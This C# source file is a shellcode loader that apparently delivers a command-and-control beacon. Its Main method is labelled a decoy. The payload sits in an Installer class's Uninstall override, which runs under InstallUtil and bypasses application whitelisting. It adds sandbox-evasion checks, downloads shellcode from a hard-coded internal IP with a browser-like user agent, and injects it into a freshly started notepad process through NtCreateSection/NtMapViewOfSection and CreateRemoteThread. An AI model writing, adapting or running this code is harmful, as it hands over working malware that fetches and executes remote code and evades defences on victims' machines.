using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Configuration.Install;
using System.Net.Http;
using System.Threading.Tasks;

namespace Shell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll")]
        public static extern uint NtClose(IntPtr handle);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        // Method to download shellcode from a URL
        private static async Task<byte[]> DownloadShellcodeAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                // Set a timeout to avoid hanging
                client.Timeout = TimeSpan.FromSeconds(30);

                // Add a user agent to look like a normal browser request
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                try
                {
                    // Download the raw bytes
                    byte[] shellcode = await client.GetByteArrayAsync(url);
                    return shellcode;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to download shellcode: {ex.Message}");
                    return null;
                }
            }
        }

        // Synchronous wrapper for the async download method
        private byte[] DownloadShellcode(string url)
        {
            Task<byte[]> downloadTask = DownloadShellcodeAsync(url);
            downloadTask.Wait();
            return downloadTask.Result;
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            // URL where the raw shellcode is hosted
            // The shellcode should be served as raw bytes (e.g., from a web server)
            string shellcodeUrl = "http://192.168.45.1:80/beacons/agent.x64.bin";

            // Download the shellcode
            byte[] buf = DownloadShellcode(shellcodeUrl);

            // Check if download was successful
            if (buf == null || buf.Length == 0)
            {
                return;
            }

            Process.Start("notepad.exe");

            Process[] expProc = Process.GetProcessesByName("notepad");
            if (expProc.Length == 0)
            {
                return;
            }

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }

            IntPtr s = IntPtr.Zero;
            IntPtr ba1 = IntPtr.Zero;
            IntPtr ba2 = IntPtr.Zero;

            uint vs = 0;
            ulong li = (ulong)buf.Length;

            uint SECTION_ALL_ACCESS = 0xF001F;
            uint SEC_COMMIT = 0x8000000;
            uint ViewShare = 1;
            ulong sectionOffset = 0;

            uint res = NtCreateSection(ref s, SECTION_ALL_ACCESS, IntPtr.Zero, ref li, 0x40, SEC_COMMIT, IntPtr.Zero);
            if (res != 0)
            {
                return;
            }

            res = NtMapViewOfSection(s, GetCurrentProcess(), ref ba1, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);
            if (res != 0)
            {
                NtClose(s);
                return;
            }

            res = NtMapViewOfSection(s, hProcess, ref ba2, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out vs, ViewShare, 0, 0x40);
            if (res != 0)
            {
                NtUnmapViewOfSection(GetCurrentProcess(), ba1);
                NtClose(s);
                return;
            }

            Marshal.Copy(buf, 0, ba1, buf.Length);

            res = NtUnmapViewOfSection(GetCurrentProcess(), ba1);
            res = NtClose(s);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ba2, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}